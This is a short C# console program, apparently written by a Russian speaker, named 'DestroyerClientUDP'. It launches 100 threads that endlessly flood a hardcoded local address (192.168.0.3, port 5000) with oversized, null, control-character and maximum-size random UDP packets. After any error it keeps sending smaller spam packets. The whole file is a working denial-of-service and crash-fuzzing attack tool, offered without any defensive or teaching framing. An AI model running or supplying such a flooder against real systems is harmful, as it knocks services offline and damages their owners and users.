using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace DestroyerClientUDP
{
    class Program
    {
        static void Main(string[] args)
        {
            Thread[] attackThreads = new Thread[100];

            for (int i = 0; i < attackThreads.Length; i++)
            {
                attackThreads[i] = new Thread(AttackServerUDP);
                attackThreads[i].Start();
                Console.WriteLine($"Атакующий поток {i + 1} запущен");
                Thread.Sleep(10);
            }

            Console.ReadLine();
        }

        static void AttackServerUDP()
        {
            IPEndPoint targetEndPoint = new IPEndPoint(IPAddress.Parse("192.168.0.3"), 5000);
            UdpClient udpClient = new UdpClient();

            try
            {
                // Начальный большой пакет
                string longName = new string('A', 10000);
                byte[] nameData = Encoding.UTF8.GetBytes(longName);
                udpClient.Send(nameData, nameData.Length, targetEndPoint);

                while (true)
                {
                    // Нулевой пакет
                    byte[] nullMessage = new byte[1024];
                    udpClient.Send(nullMessage, nullMessage.Length, targetEndPoint);

                    // Пакет с управляющими символами и большим содержимым
                    string crashString = "\0\n\r\t\x00\x1B\xFF" + new string('X', 5000);
                    byte[] crashData = Encoding.UTF8.GetBytes(crashString);
                    udpClient.Send(crashData, crashData.Length, targetEndPoint);

                    // Максимальный UDP пакет (65k)
                    byte[] maxPacket = new byte[65507];
                    new Random().NextBytes(maxPacket);
                    udpClient.Send(maxPacket, maxPacket.Length, targetEndPoint);

                    Thread.Sleep(1);
                }
            }
            catch
            {
                // При ошибке продолжаем спамить
                while (true)
                {
                    try
                    {
                        byte[] spamPacket = new byte[1400]; // Стандартный MTU пакет
                        new Random().NextBytes(spamPacket);
                        udpClient.Send(spamPacket, spamPacket.Length, targetEndPoint);
                    }
                    catch { }
                    Thread.Sleep(10);
                }
            }
            finally
            {
                udpClient.Close();
            }
        }
    }
}
